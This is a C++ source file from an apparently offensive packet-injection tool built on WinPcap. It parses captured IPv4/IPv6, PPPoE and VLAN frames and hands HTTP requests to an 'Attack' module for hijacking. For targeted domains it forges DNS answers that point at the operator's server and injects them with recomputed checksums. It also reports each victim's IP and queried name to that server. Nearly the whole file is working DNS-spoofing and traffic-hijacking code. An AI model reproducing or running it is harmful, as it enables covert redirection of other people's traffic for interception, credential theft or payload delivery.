
#include "PacketProc.h"
#include "Packet.h"
#include "Public.h"

#include "HttpUtils.h"
#include "attack.h"
#include "utils/checksum.h"
#include "DnsUtils/dnsUtils.h"
#include "informer.h"
#include "attacker.h"
#include "winpcap.h"




#define MIN_DNS_PACKET_SIZE			20
#define MIN_TCP_PACKET_SIZE			4
#define CAPRAW_ERROR_FILENAME		"capraw_error.txt"


Packet::~Packet() {

}



Packet::Packet(unsigned long serverip, unsigned long localip, string userPluginPath,int mode, pcap_t * pcapt) {

	if (mInstance)
	{
		return;
	}
	mInstance = this;

	int iRet = 0;

	mPcapt = pcapt;
	mMode = mode;
	mServerIP = serverip;
	mLocalIP = localip;


	mDnsAnswer.Name = htons(0xc00c);
	mDnsAnswer.Type = htons(0x0001);
	mDnsAnswer.Class = htons(0x0001);
	mDnsAnswer.HighTTL = htons(0x0000);
	mDnsAnswer.LowTTL = htons(0x0040);
	mDnsAnswer.AddrLen = htons(0x0004);
	mDnsAnswer.Address = mServerIP;


	mDnsAnswerIPV6.Name = htons(0xc00c);
	mDnsAnswerIPV6.Type = htons(0x001c);
	mDnsAnswerIPV6.Class = htons(0x0001);
	mDnsAnswerIPV6.HighTTL = htons(0x0000);
	mDnsAnswerIPV6.LowTTL = htons(0x0040);
	mDnsAnswerIPV6.AddrLen = htons(0x0010);
	HttpUtils::ipv4toipv6((unsigned char*)&mServerIP, mDnsAnswerIPV6.Address);

	mInformer = new Informer((LPVOID)mServerIP);

	attack = new Attack(userPluginPath, mServerIP);

	Sleep(1000);

	iRet = mInformer->notify(mLocalIP, "");
}



int Packet::parsePacket(const char * pData, int iCapLen) {
	int iRet = 0;

	LPPPPOEHEADER pppoe = 0;
	LPIPHEADER pIPV4Hdr = 0;
	LPIPV6HEADER pIPV6 = 0;
	LPMACHEADER pMac = (LPMACHEADER)pData;
	int iptype = Packet::getIPHdr(pMac, pppoe, pIPV4Hdr, pIPV6);
	if (iptype <= 0)
	{
		return -1;
	}
	else if (iptype == 1)
	{
		if (pIPV4Hdr->Version != 4)
		{
			printf("ipv4 header version error\r\n");
			return -1;
		}

		int iIpv4HdrLen = pIPV4Hdr->HeaderSize << 2;
		int iIpPackLen = ntohs(pIPV4Hdr->PacketSize);
		int realPackSize = iIpPackLen + ((char*)pIPV4Hdr - pData);
		//dns:14 + 20 + 8 + 12 + 4 + 4=62 or tcp:14+20+20=54
		if (realPackSize >= WINPCAP_MAX_PACKET_SIZE || realPackSize <= 0)
		{
			printf("ip packet length:%u,ip header length:%u error\r\n", iIpPackLen, iIpv4HdrLen);
			return -1;
		}
		else if (realPackSize <= 60)
		{
			return realPackSize;
		}

		if (pIPV4Hdr->Protocol == IPPROTO_TCP)
		{
			LPTCPHEADER pTcpHdr = (LPTCPHEADER)((char*)pIPV4Hdr + iIpv4HdrLen);
			int iTcpHdrLen = pTcpHdr->HeaderSize << 2;
			char * packData = (char*)pTcpHdr + iTcpHdrLen;
			int packDataLen = iIpPackLen - iIpv4HdrLen - iTcpHdrLen;
			if (packDataLen <= MIN_TCP_PACKET_SIZE) {
				return realPackSize;
			}

			if (HttpUtils::isHttpPacket(packData))
			{
				string url = HttpUtils::getLongUrl(packData, packDataLen);
				if (url == "")
				{
					url = HttpUtils::getUrl(packData,packDataLen);
					if (url == "")
					{
						return realPackSize;
					}
				}
				string host = HttpUtils::getValueFromKey(packData, string("Host"));

				char * httpdata = 0;

				string httphdr = HttpUtils::getHttpHeader(packData, packDataLen, &httpdata);

				iRet = attack->attack(url.c_str(), host.c_str(), httpdata, mPcapt, pData, realPackSize, (CHAR*)pIPV4Hdr, iptype, pppoe);
			}

			return realPackSize;
		}
		else if (pIPV4Hdr->Protocol == IPPROTO_UDP)
		{
			LPUDPHEADER pUdpHdr = (LPUDPHEADER)((char*)pIPV4Hdr + iIpv4HdrLen);
			unsigned short usDport = ntohs(pUdpHdr->DstPort);
			if (usDport != DNS_PORT) {
				return realPackSize;
			}

			unsigned short usUdpSize = ntohs(pUdpHdr->PacketSize);
			int iDnsPackLen = usUdpSize - sizeof(UDPHEADER);
			if (iDnsPackLen >= DNS_PACKET_LIMIT || iDnsPackLen <= MIN_DNS_PACKET_SIZE)
			{
				return realPackSize;
			}

			LPDNSHEADER pDnsHdr = (LPDNSHEADER)((char*)pUdpHdr + sizeof(UDPHEADER));
			if (mMode == 3 )
			{
				if (pDnsHdr->TransactionID == LOCAL_QUERY_DNS_ID)
				{
					if (pIPV4Hdr->SrcIP == mLocalIP && pIPV4Hdr->DstIP == LOCAL_DNS_QUERY_SERVER)
					{
						return realPackSize;
					}
				}
			}

			char * dnsname = (char*)((char*)pDnsHdr + sizeof(DNSHEADER));
			iRet = DnsUitls::isTargetDNS(dnsname);
			if (iRet == 0) {
				return realPackSize;
			}


			if (pppoe != 0)
			{
				pppoe->len = ntohs(ntohs(pppoe->len) + sizeof(DNSANSWER));
			}

			pDnsHdr->Flags = 0x8081;
			pDnsHdr->Questions = 0x0100;
			pDnsHdr->AnswerRRS = 0x0100;
			pDnsHdr->AuthorityRRS = 0x0000;
			pDnsHdr->AdditionalRRS = 0x0000;
			memcpy((unsigned char*)pDnsHdr + iDnsPackLen, (unsigned char *)&mDnsAnswer, sizeof(DNSANSWER));

			unsigned short  TmpPort = pUdpHdr->SrcPort;
			pUdpHdr->SrcPort = pUdpHdr->DstPort;
			pUdpHdr->DstPort = TmpPort;
			pUdpHdr->PacketSize = htons(usUdpSize + sizeof(DNSANSWER));
			pUdpHdr->PacketChksum = 0;
			pUdpHdr->PacketChksum = 
				Checksum::subPackChecksum((char*)pUdpHdr, usUdpSize + sizeof(DNSANSWER), pIPV4Hdr->SrcIP, pIPV4Hdr->DstIP, IPPROTO_UDP);

			//pIPHdr->DF = 0;
			//pIPHdr->Unnamed = 0;
			//pIPHdr->FragmentOffset = 0;
			//pIPHdr->MF = 0;
			pIPV4Hdr->flag = 0;
			pIPV4Hdr->PacketSize = htons(iIpPackLen + sizeof(DNSANSWER));
			pIPV4Hdr->PacketID = ntohs(ntohs(pIPV4Hdr->PacketID) + 1);
			pIPV4Hdr->TimeToLive = 0x7f;

			unsigned int TmpIP = pIPV4Hdr->SrcIP;
			pIPV4Hdr->SrcIP = pIPV4Hdr->DstIP;
			pIPV4Hdr->DstIP = TmpIP;
			pIPV4Hdr->HeaderChksum = 0;
			pIPV4Hdr->HeaderChksum = Checksum::checksum((unsigned short*)pIPV4Hdr, iIpv4HdrLen);

			char pTmpMac[MAC_ADDRESS_SIZE];
			memcpy(pTmpMac, pMac->DstMAC, MAC_ADDRESS_SIZE);
			memcpy(pMac->DstMAC, pMac->SrcMAC, MAC_ADDRESS_SIZE);
			memcpy(pMac->SrcMAC, pTmpMac, MAC_ADDRESS_SIZE);

			iRet = pcap_sendpacket(mPcapt, (const unsigned char*)pData, realPackSize + sizeof(DNSANSWER));
			if (iRet == 0)
			{
				mInformer->notify(TmpIP, dnsname);
															
				//Public::recorduser(pIPHdr->DstIP, dnsname);								
				//printf("process dns:%s,length:%u ok\r\n", dnsname, realPackSize + sizeof(DNSANSWER));
			}
			else {
				printf("pcap_sendpacket dns:%s,length:%u error\r\n", dnsname, realPackSize + sizeof(DNSANSWER));
			}
		}
		return realPackSize;
	}
	else if (iptype == 2)
	{
		if (pIPV6->Version != 6)
		{
			printf("ipv6 header version error\r\n");
			return -1;
		}

		int iIpPackLen = ntohs(pIPV6->PayloadLen);
		int realPackSize = iIpPackLen + ((char*)pIPV6 - pData) + sizeof(IPV6HEADER);
		if (realPackSize >= WINPCAP_MAX_PACKET_SIZE || realPackSize <= 0)
		{
			printf("ipv6 payload length:%u,header length:%u error\r\n", iIpPackLen, sizeof(IPV6HEADER));
			return -1;
		}

		if (pIPV6->NextPacket == IPPROTO_TCP)
		{
			LPTCPHEADER pTcpHdr = (LPTCPHEADER)((char*)pIPV6 + sizeof(IPV6HEADER));
			int iTcpHdrLen = pTcpHdr->HeaderSize << 2;
			char * packData = (char*)pTcpHdr + iTcpHdrLen;
			int packDataLen = iIpPackLen - iTcpHdrLen;
			if (packDataLen <= MIN_TCP_PACKET_SIZE) {
				return realPackSize;
			}

			if (HttpUtils::isHttpPacket(packData))
			{
				string url = HttpUtils::getLongUrl(packData, packDataLen);
				if (url == "")
				{
					url = HttpUtils::getUrl(packData,packDataLen);
					if (url == "") {
						return realPackSize;
					}
				}
				string host = HttpUtils::getValueFromKey(packData, string("Host"));

				char * httpdata = 0;

				string httphdr = HttpUtils::getHttpHeader(packData, packDataLen, &httpdata);

				iRet = attack->attack(url.c_str(), host.c_str(), httpdata, mPcapt, pData, realPackSize, (CHAR*)pIPV6, iptype, pppoe);
			}

			return realPackSize;
		}
		else if (pIPV6->NextPacket == IPPROTO_UDP)
		{
			LPUDPHEADER pUDPHdr = (LPUDPHEADER)((char*)pIPV6 + sizeof(IPV6HEADER));
			unsigned short usDport = ntohs(pUDPHdr->DstPort);
			if (usDport != DNS_PORT) {
				return realPackSize;
			}
			unsigned short usUdpSize = ntohs(pUDPHdr->PacketSize);
			unsigned int iDnsPackLen = usUdpSize - sizeof(UDPHEADER);
			if (iDnsPackLen <= MIN_DNS_PACKET_SIZE || iDnsPackLen >= DNS_PACKET_LIMIT)
			{
				return realPackSize;
			}

			LPDNSHEADER pDnsHdr = (LPDNSHEADER)((char*)pUDPHdr + sizeof(UDPHEADER));
			if (mMode == 3)
			{
				if (pDnsHdr->TransactionID == LOCAL_QUERY_DNS_ID)
				{
					return realPackSize;
				}
			}

			char * dnsname = (char*)((char*)pDnsHdr + sizeof(DNSHEADER));
			iRet = DnsUitls::isTargetDNS(dnsname);
			if (iRet == 0) {
				return realPackSize;
			}

			LPDNSTYPECLASS typecls = (LPDNSTYPECLASS)((char*)pUDPHdr + usUdpSize - sizeof(DNSTYPECLASS));
			int iSize = 0;
			if (typecls->dnstype == 0x1c00)
			{
				iSize = sizeof(DNSANSWERIPV6);
			}else if (typecls->dnstype == 0x0100)
			{
				iSize = sizeof(DNSANSWER);
			}
			else {
				return realPackSize;
			}

			if (pppoe != 0)
			{
				pppoe->len = ntohs(ntohs(pppoe->len) + iSize);
			}
			//00 1c 00 01代表dns请求ipv6地址
			pDnsHdr->Flags = 0x8081;
			pDnsHdr->Questions = 0x0100;
			pDnsHdr->AnswerRRS = 0x0100;
			pDnsHdr->AuthorityRRS = 0x0000;
			pDnsHdr->AdditionalRRS = 0x0000;

			if (typecls->dnstype == 0x1c00)
			{
				memcpy((unsigned char*)pDnsHdr + iDnsPackLen, (unsigned char *)&mDnsAnswerIPV6, iSize);
			}else if (typecls->dnstype == 0x0100)
			{
				memcpy((unsigned char*)pDnsHdr + iDnsPackLen, (unsigned char *)&mDnsAnswer, iSize);
			}
			
			unsigned short  TmpPort = pUDPHdr->SrcPort;
			pUDPHdr->SrcPort = pUDPHdr->DstPort;
			pUDPHdr->DstPort = TmpPort;
			pUDPHdr->PacketSize = htons(usUdpSize + iSize);
			pUDPHdr->PacketChksum = 0;
			pUDPHdr->PacketChksum = Checksum::IPV6subPackCheckSum((char*)pUDPHdr, usUdpSize + iSize,pIPV6->SourceAddress, pIPV6->DestAddress, 
				IPPROTO_UDP);

			char tmpIP[IPV6_IP_SIZE];
			memcpy(tmpIP, pIPV6->SourceAddress, IPV6_IP_SIZE);
			memcpy(pIPV6->SourceAddress, pIPV6->DestAddress, IPV6_IP_SIZE);
			memcpy(pIPV6->DestAddress, tmpIP, IPV6_IP_SIZE);
			pIPV6->FlowLabelHigh4 = 0;
			pIPV6->FlowLabelLow16 = 0;
			pIPV6->TraficClassLow4 = 0;
			pIPV6->TCHigh4bits = 0;
			pIPV6->PayloadLen = ntohs(iIpPackLen + iSize);

			char pTmpMac[MAC_ADDRESS_SIZE];
			memcpy(pTmpMac, pMac->DstMAC, MAC_ADDRESS_SIZE);
			memcpy(pMac->DstMAC, pMac->SrcMAC, MAC_ADDRESS_SIZE);
			memcpy(pMac->SrcMAC, pTmpMac, MAC_ADDRESS_SIZE);

			iRet = pcap_sendpacket(mPcapt, (const unsigned char*)pData, realPackSize + iSize);
			if (iRet == 0)
			{
				unsigned long myip = 0x12345678;
				mInformer->notify(myip, dnsname);					

				//printf("pcap_sendpacket ipv6 dns:%s,length:%u ok\r\n", dnsname, realPackSize + iSize);
				//Public::recordipv6user(pIPHdr->DestAddress, iDnsQueryName);
			}
			else
			{
				printf("pcap_sendpacket ipv6 dns:%s,length:%u error\r\n", dnsname, realPackSize + iSize);
			}
		}
		return realPackSize;
	}

	return -1;
}



int Packet::getIPHdr(LPMACHEADER mac, LPPPPOEHEADER & pppoe, LPIPHEADER &ip, LPIPV6HEADER &ipv6) {
	char * nexthdr = (char*)mac + sizeof(MACHEADER);
	int nextprotocol = mac->Protocol;
	if (nextprotocol == 0x0081)
	{
		LPHEADER8021Q p8021q = (LPHEADER8021Q)nexthdr;
		if (p8021q->type == 0x0081)
		{
			LPHEADER8021Q p8021q2 = LPHEADER8021Q((char*)p8021q + sizeof(HEADER8021Q));

			nexthdr = (char*)p8021q2 + (sizeof(HEADER8021Q));

			nextprotocol = p8021q2->type;
		}
		else {
			nexthdr = (char*)p8021q + sizeof(HEADER8021Q);

			nextprotocol = p8021q->type;
		}
	}
	else if (nextprotocol == 0x9899 || nextprotocol == 0xa788 || nextprotocol == 0xcc88)
	{
		return 0;
	}

	//0x8863（Discovery阶段或拆链阶段）或者0x8864（Session阶段）
	if (nextprotocol == 0x6488)
	{
		//0×C021 LCP数据报文
		//0×8021 NCP数据报文
		//0×0021 IP数据报文

		pppoe = (LPPPPOEHEADER)nexthdr;
		nextprotocol = pppoe->protocol;
		if (nextprotocol == 0x2100)
		{
			nexthdr = (char*)pppoe + sizeof(PPPOEHEADER);

			ip = (LPIPHEADER)nexthdr;

			return 1;
		}
		else if (nextprotocol == 0x5700 || nextprotocol == 0x5780) //ipv6
		{
			nexthdr = (char*)pppoe + sizeof(PPPOEHEADER);

			ipv6 = (LPIPV6HEADER)nexthdr;

			return 2;
		}
		else if (nextprotocol == 0x21c0 || 
			nextprotocol == 0x0101 || 
			nextprotocol == 0x23c0 || 
			nextprotocol == 0x22c0 || 
			nextprotocol == 0x2180)
		{
			return 0;
		}
		else {
			return -1;
		}
	}
	else if (nextprotocol == 0x0008)
	{
		ip = (LPIPHEADER)nexthdr;
		return 1;
	}
	else if (nextprotocol == 0xdd86)
	{
		ipv6 = (LPIPV6HEADER)nexthdr;

		return 2;
	}
	//0x2700 IEEE 802.3
	else if (nextprotocol == 0x0608 || nextprotocol == 0x6388 || nextprotocol == 0x2700)
	{
		return 0;
	}
	else {
		return -1;
	}
}